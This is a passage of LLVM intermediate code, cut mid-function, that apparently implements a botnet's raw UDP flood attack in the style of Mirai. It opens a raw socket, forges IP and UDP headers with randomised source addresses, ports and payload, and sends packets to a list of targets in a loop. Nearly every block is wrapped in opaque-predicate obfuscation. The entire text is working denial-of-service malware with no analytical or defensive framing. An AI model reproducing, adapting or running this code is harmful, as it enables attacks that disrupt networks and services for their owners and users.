  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 512)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  %70 = icmp sgt i32 %69, 1460
  br i1 %70, label %71, label %88

; <label>:71:                                     ; preds = %4
  %72 = load i32, i32* @x.33
  %73 = load i32, i32* @y.34
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %71
  store i16 1460, i16* %18, align 2
  %80 = load i32, i32* @x.33
  %81 = load i32, i32* @y.34
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %88

; <label>:88:                                     ; preds = %originalBBpart2, %4
  %89 = load i32, i32* @x.33
  %90 = load i32, i32* @y.34
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %88
  %97 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %97, i32* %10, align 4
  %98 = icmp eq i32 %97, -1
  %99 = load i32, i32* @x.33
  %100 = load i32, i32* @y.34
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %98, label %107, label %108

; <label>:107:                                    ; preds = %originalBBpart24
  br label %520

; <label>:108:                                    ; preds = %originalBBpart24
  store i32 1, i32* %9, align 4
  %109 = load i32, i32* %10, align 4
  %110 = bitcast i32* %9 to i8*
  %111 = call i32 @setsockopt(i32 %109, i32 0, i32 3, i8* %110, i32 4) #6
  %112 = icmp eq i32 %111, -1
  br i1 %112, label %113, label %116

; <label>:113:                                    ; preds = %108
  %114 = load i32, i32* %10, align 4
  %115 = call i32 @close(i32 %114)
  br label %520

; <label>:116:                                    ; preds = %108
  %117 = load i32, i32* @x.33
  %118 = load i32, i32* @y.34
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %116
  store i32 0, i32* %9, align 4
  %125 = load i32, i32* @x.33
  %126 = load i32, i32* @y.34
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %133

; <label>:133:                                    ; preds = %originalBBpart227, %originalBBpart28
  %134 = load i32, i32* @x.33
  %135 = load i32, i32* @y.34
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %133
  %142 = load i32, i32* %9, align 4
  %143 = load i8, i8* %5, align 1
  %144 = zext i8 %143 to i32
  %145 = icmp slt i32 %142, %144
  %146 = load i32, i32* @x.33
  %147 = load i32, i32* @y.34
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %145, label %154, label %266

; <label>:154:                                    ; preds = %originalBBpart212
  %155 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %156 = load i8**, i8*** %11, align 8
  %157 = load i32, i32* %9, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds i8*, i8** %156, i64 %158
  store i8* %155, i8** %159, align 8
  %160 = load i8**, i8*** %11, align 8
  %161 = load i32, i32* %9, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i8*, i8** %160, i64 %162
  %164 = load i8*, i8** %163, align 8
  %165 = bitcast i8* %164 to %struct.iphdr*
  store %struct.iphdr* %165, %struct.iphdr** %21, align 8
  %166 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i64 1
  %168 = bitcast %struct.iphdr* %167 to %struct.udphdr*
  store %struct.udphdr* %168, %struct.udphdr** %22, align 8
  %169 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %170 = bitcast %struct.iphdr* %169 to i8*
  %171 = load i8, i8* %170, align 4
  %172 = and i8 %171, 15
  %173 = or i8 %172, 64
  store i8 %173, i8* %170, align 4
  %174 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %175 = bitcast %struct.iphdr* %174 to i8*
  %176 = load i8, i8* %175, align 4
  %177 = and i8 %176, -16
  %178 = or i8 %177, 5
  store i8 %178, i8* %175, align 4
  %179 = load i8, i8* %12, align 1
  %180 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 1
  store i8 %179, i8* %181, align 1
  %182 = load i16, i16* %18, align 2
  %183 = zext i16 %182 to i64
  %184 = add i64 28, %183
  %185 = trunc i64 %184 to i16
  %186 = call zeroext i16 @htons(i16 zeroext %185) #7
  %187 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 2
  store i16 %186, i16* %188, align 2
  %189 = load i16, i16* %13, align 2
  %190 = call zeroext i16 @htons(i16 zeroext %189) #7
  %191 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 3
  store i16 %190, i16* %192, align 4
  %193 = load i8, i8* %14, align 1
  %194 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 5
  store i8 %193, i8* %195, align 4
  %196 = load i8, i8* %15, align 1
  %197 = icmp ne i8 %196, 0
  br i1 %197, label %198, label %218

; <label>:198:                                    ; preds = %154
  %199 = load i32, i32* @x.33
  %200 = load i32, i32* @y.34
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %198
  %207 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %208 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 4
  store i16 %207, i16* %209, align 2
  %210 = load i32, i32* @x.33
  %211 = load i32, i32* @y.34
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %218

; <label>:218:                                    ; preds = %originalBBpart216, %154
  %219 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %220 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %219, i32 0, i32 6
  store i8 17, i8* %220, align 1
  %221 = load i32, i32* %20, align 4
  %222 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i32 0, i32 8
  store i32 %221, i32* %223, align 4
  %224 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %225 = load i32, i32* %9, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %224, i64 %226
  %228 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %227, i32 0, i32 1
  %229 = load i32, i32* %228, align 4
  %230 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i32 0, i32 9
  store i32 %229, i32* %231, align 4
  %232 = load i16, i16* %16, align 2
  %233 = call zeroext i16 @htons(i16 zeroext %232) #7
  %234 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %235 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %234, i32 0, i32 0
  store i16 %233, i16* %235, align 2
  %236 = load i16, i16* %17, align 2
  %237 = call zeroext i16 @htons(i16 zeroext %236) #7
  %238 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %239 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %238, i32 0, i32 1
  store i16 %237, i16* %239, align 2
  %240 = load i16, i16* %18, align 2
  %241 = zext i16 %240 to i64
  %242 = add i64 8, %241
  %243 = trunc i64 %242 to i16
  %244 = call zeroext i16 @htons(i16 zeroext %243) #7
  %245 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %246 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %245, i32 0, i32 2
  store i16 %244, i16* %246, align 2
  br label %247

; <label>:247:                                    ; preds = %218
  %248 = load i32, i32* @x.33
  %249 = load i32, i32* @y.34
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %247
  %256 = load i32, i32* %9, align 4
  %257 = add nsw i32 %256, 1
  store i32 %257, i32* %9, align 4
  %258 = load i32, i32* @x.33
  %259 = load i32, i32* @y.34
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBBpart227, label %originalBB18alteredBB

originalBBpart227:                                ; preds = %originalBB18
  br label %133

; <label>:266:                                    ; preds = %originalBBpart212
  br label %267

; <label>:267:                                    ; preds = %originalBBpart255, %266
  %268 = load i32, i32* @x.33
  %269 = load i32, i32* @y.34
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %267
  store i32 0, i32* %9, align 4
  %276 = load i32, i32* @x.33
  %277 = load i32, i32* @y.34
  %278 = sub i32 %276, 1
  %279 = mul i32 %276, %278
  %280 = urem i32 %279, 2
  %281 = icmp eq i32 %280, 0
  %282 = icmp slt i32 %277, 10
  %283 = or i1 %281, %282
  br i1 %283, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %284

; <label>:284:                                    ; preds = %500, %originalBBpart231
  %285 = load i32, i32* @x.33
  %286 = load i32, i32* @y.34
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %284
  %293 = load i32, i32* %9, align 4
  %294 = load i8, i8* %5, align 1
  %295 = zext i8 %294 to i32
  %296 = icmp slt i32 %293, %295
  %297 = load i32, i32* @x.33
  %298 = load i32, i32* @y.34
  %299 = sub i32 %297, 1
  %300 = mul i32 %297, %299
  %301 = urem i32 %300, 2
  %302 = icmp eq i32 %301, 0
  %303 = icmp slt i32 %298, 10
  %304 = or i1 %302, %303
  br i1 %304, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %296, label %305, label %503

; <label>:305:                                    ; preds = %originalBBpart235
  %306 = load i8**, i8*** %11, align 8
  %307 = load i32, i32* %9, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds i8*, i8** %306, i64 %308
  %310 = load i8*, i8** %309, align 8
  store i8* %310, i8** %23, align 8
  %311 = load i8*, i8** %23, align 8
  %312 = bitcast i8* %311 to %struct.iphdr*
  store %struct.iphdr* %312, %struct.iphdr** %24, align 8
  %313 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %314 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %313, i64 1
  %315 = bitcast %struct.iphdr* %314 to %struct.udphdr*
  store %struct.udphdr* %315, %struct.udphdr** %25, align 8
  %316 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %317 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %316, i64 1
  %318 = bitcast %struct.udphdr* %317 to i8*
  store i8* %318, i8** %26, align 8
  %319 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %320 = load i32, i32* %9, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %319, i64 %321
  %323 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %322, i32 0, i32 2
  %324 = load i8, i8* %323, align 4
  %325 = zext i8 %324 to i32
  %326 = icmp slt i32 %325, 32
  br i1 %326, label %327, label %348

; <label>:327:                                    ; preds = %305
  %328 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %329 = load i32, i32* %9, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %328, i64 %330
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %331, i32 0, i32 1
  %333 = load i32, i32* %332, align 4
  %334 = call i32 @ntohl(i32 %333) #7
  %335 = call i32 @rand_next()
  %336 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %337 = load i32, i32* %9, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %336, i64 %338
  %340 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %339, i32 0, i32 2
  %341 = load i8, i8* %340, align 4
  %342 = zext i8 %341 to i32
  %343 = lshr i32 %335, %342
  %344 = add i32 %334, %343
  %345 = call i32 @htonl(i32 %344) #7
  %346 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %347 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %346, i32 0, i32 9
  store i32 %345, i32* %347, align 4
  br label %348

; <label>:348:                                    ; preds = %327, %305
  %349 = load i32, i32* %20, align 4
  %350 = icmp eq i32 %349, -1
  br i1 %350, label %351, label %355

; <label>:351:                                    ; preds = %348
  %352 = call i32 @rand_next()
  %353 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %354 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %353, i32 0, i32 8
  store i32 %352, i32* %354, align 4
  br label %355

; <label>:355:                                    ; preds = %351, %348
  %356 = load i32, i32* @x.33
  %357 = load i32, i32* @y.34
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %355
  %364 = load i16, i16* %13, align 2
  %365 = zext i16 %364 to i32
  %366 = icmp eq i32 %365, 65535
  %367 = load i32, i32* @x.33
  %368 = load i32, i32* @y.34
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %366, label %375, label %396

; <label>:375:                                    ; preds = %originalBBpart239
  %376 = load i32, i32* @x.33
  %377 = load i32, i32* @y.34
  %378 = sub i32 %376, 1
  %379 = mul i32 %376, %378
  %380 = urem i32 %379, 2
  %381 = icmp eq i32 %380, 0
  %382 = icmp slt i32 %377, 10
  %383 = or i1 %381, %382
  br i1 %383, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %375
  %384 = call i32 @rand_next()
  %385 = trunc i32 %384 to i16
  %386 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %387 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %386, i32 0, i32 3
  store i16 %385, i16* %387, align 4
  %388 = load i32, i32* @x.33
  %389 = load i32, i32* @y.34
  %390 = sub i32 %388, 1
  %391 = mul i32 %388, %390
  %392 = urem i32 %391, 2
  %393 = icmp eq i32 %392, 0
  %394 = icmp slt i32 %389, 10
  %395 = or i1 %393, %394
  br i1 %395, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br label %396

; <label>:396:                                    ; preds = %originalBBpart243, %originalBBpart239
  %397 = load i16, i16* %16, align 2
  %398 = zext i16 %397 to i32
  %399 = icmp eq i32 %398, 65535
  br i1 %399, label %400, label %421

; <label>:400:                                    ; preds = %396
  %401 = load i32, i32* @x.33
  %402 = load i32, i32* @y.34
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %400
  %409 = call i32 @rand_next()
  %410 = trunc i32 %409 to i16
  %411 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %412 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %411, i32 0, i32 0
  store i16 %410, i16* %412, align 2
  %413 = load i32, i32* @x.33
  %414 = load i32, i32* @y.34
  %415 = sub i32 %413, 1
  %416 = mul i32 %413, %415
  %417 = urem i32 %416, 2
  %418 = icmp eq i32 %417, 0
  %419 = icmp slt i32 %414, 10
  %420 = or i1 %418, %419
  br i1 %420, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br label %421

; <label>:421:                                    ; preds = %originalBBpart247, %396
  %422 = load i16, i16* %17, align 2
  %423 = zext i16 %422 to i32
  %424 = icmp eq i32 %423, 65535
  br i1 %424, label %425, label %430

; <label>:425:                                    ; preds = %421
  %426 = call i32 @rand_next()
  %427 = trunc i32 %426 to i16
  %428 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %429 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %428, i32 0, i32 1
  store i16 %427, i16* %429, align 2
  br label %430

; <label>:430:                                    ; preds = %425, %421
  %431 = load i32, i32* @x.33
  %432 = load i32, i32* @y.34
  %433 = sub i32 %431, 1
  %434 = mul i32 %431, %433
  %435 = urem i32 %434, 2
  %436 = icmp eq i32 %435, 0
  %437 = icmp slt i32 %432, 10
  %438 = or i1 %436, %437
  br i1 %438, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %430
  %439 = load i8, i8* %19, align 1
  %440 = icmp ne i8 %439, 0
  %441 = load i32, i32* @x.33
  %442 = load i32, i32* @y.34
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br i1 %440, label %449, label %453

; <label>:449:                                    ; preds = %originalBBpart251
  %450 = load i8*, i8** %26, align 8
  %451 = load i16, i16* %18, align 2
  %452 = zext i16 %451 to i32
  call void @rand_str(i8* %450, i32 %452)
  br label %453

; <label>:453:                                    ; preds = %449, %originalBBpart251
  %454 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %455 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %454, i32 0, i32 7
  store i16 0, i16* %455, align 2
  %456 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %457 = bitcast %struct.iphdr* %456 to i16*
  %458 = call zeroext i16 @checksum_generic(i16* %457, i32 20)
  %459 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %460 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %459, i32 0, i32 7
  store i16 %458, i16* %460, align 2
  %461 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %462 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %461, i32 0, i32 3
  store i16 0, i16* %462, align 2
  %463 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %464 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %465 = bitcast %struct.udphdr* %464 to i8*
  %466 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %467 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %466, i32 0, i32 2
  %468 = load i16, i16* %467, align 2
  %469 = load i16, i16* %18, align 2
  %470 = zext i16 %469 to i64
  %471 = add i64 8, %470
  %472 = trunc i64 %471 to i32
  %473 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %463, i8* %465, i16 zeroext %468, i32 %472)
  %474 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %475 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %474, i32 0, i32 3
  store i16 %473, i16* %475, align 2
  %476 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %477 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %476, i32 0, i32 1
  %478 = load i16, i16* %477, align 2
  %479 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %480 = load i32, i32* %9, align 4
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %479, i64 %481
  %483 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %482, i32 0, i32 0
  %484 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %483, i32 0, i32 1
  store i16 %478, i16* %484, align 2
  %485 = load i32, i32* %10, align 4
  %486 = load i8*, i8** %23, align 8
  %487 = load i16, i16* %18, align 2
  %488 = zext i16 %487 to i64
  %489 = add i64 28, %488
  %490 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %491 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %492 = load i32, i32* %9, align 4
  %493 = sext i32 %492 to i64
  %494 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %491, i64 %493
  %495 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %494, i32 0, i32 0
  %496 = bitcast %struct.sockaddr_in* %495 to %struct.sockaddr*
  store %struct.sockaddr* %496, %struct.sockaddr** %490, align 8
  %497 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %498 = load %struct.sockaddr*, %struct.sockaddr** %497, align 8
  %499 = call i64 @sendto(i32 %485, i8* %486, i64 %489, i32 16384, %struct.sockaddr* %498, i32 16)
  br label %500

; <label>:500:                                    ; preds = %453
  %501 = load i32, i32* %9, align 4
  %502 = add nsw i32 %501, 1
  store i32 %502, i32* %9, align 4
  br label %284

; <label>:503:                                    ; preds = %originalBBpart235
  %504 = load i32, i32* @x.33
  %505 = load i32, i32* @y.34
  %506 = sub i32 %504, 1
  %507 = mul i32 %504, %506
  %508 = urem i32 %507, 2
  %509 = icmp eq i32 %508, 0
  %510 = icmp slt i32 %505, 10
  %511 = or i1 %509, %510
  br i1 %511, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %503
  %512 = load i32, i32* @x.33
  %513 = load i32, i32* @y.34
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br label %267

; <label>:520:                                    ; preds = %113, %107
  %521 = load i32, i32* @x.33
  %522 = load i32, i32* @y.34
  %523 = sub i32 %521, 1
  %524 = mul i32 %521, %523
  %525 = urem i32 %524, 2
  %526 = icmp eq i32 %525, 0
  %527 = icmp slt i32 %522, 10
  %528 = or i1 %526, %527
  br i1 %528, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %520
  %529 = load i32, i32* @x.33
  %530 = load i32, i32* @y.34
  %531 = sub i32 %529, 1
  %532 = mul i32 %529, %531
  %533 = urem i32 %532, 2
  %534 = icmp eq i32 %533, 0
  %535 = icmp slt i32 %530, 10
  %536 = or i1 %534, %535
  br i1 %536, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %71
  store i16 1460, i16* %18, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %88
  %537 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %537, i32* %10, align 4
  %538 = icmp eq i32 %537, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %116
  store i32 0, i32* %9, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %133
  %539 = load i32, i32* %9, align 4
  %540 = load i8, i8* %5, align 1
  %541 = zext i8 %540 to i32
  %542 = icmp slt i32 %539, %541
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %198
  %543 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %544 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %545 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %544, i32 0, i32 4
  store i16 %543, i16* %545, align 2
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %247
  %546 = load i32, i32* %9, align 4
  %_ = sub i32 %546, 1
  %gen = mul i32 %_, 1
  %_19 = sub i32 0, %546
  %gen20 = add i32 %_19, 1
  %_21 = sub i32 0, %546
  %gen22 = add i32 %_21, 1
  %_23 = sub i32 0, %546
  %gen24 = add i32 %_23, 1
  %_25 = shl i32 %546, 1
  %547 = add nsw i32 %546, 1
  store i32 %547, i32* %9, align 4
  br label %originalBB18

originalBB29alteredBB:                            ; preds = %originalBB29, %267
  store i32 0, i32* %9, align 4
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %284
  %548 = load i32, i32* %9, align 4
  %549 = load i8, i8* %5, align 1
  %550 = zext i8 %549 to i32
  %551 = icmp slt i32 %548, %550
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %355
  %552 = load i16, i16* %13, align 2
  %553 = zext i16 %552 to i32
  %554 = icmp eq i32 %553, 65535
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %375
  %555 = call i32 @rand_next()
  %556 = trunc i32 %555 to i16
  %557 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %558 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %557, i32 0, i32 3
  store i16 %556, i16* %558, align 4
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %400
  %559 = call i32 @rand_next()
  %560 = trunc i32 %559 to i16
  %561 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %562 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %561, i32 0, i32 0
  store i16 %560, i16* %562, align 2
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %430
  %563 = load i8, i8* %19, align 1
  %564 = icmp ne i8 %563, 0
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %503
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %520
  br label %originalBB57
}

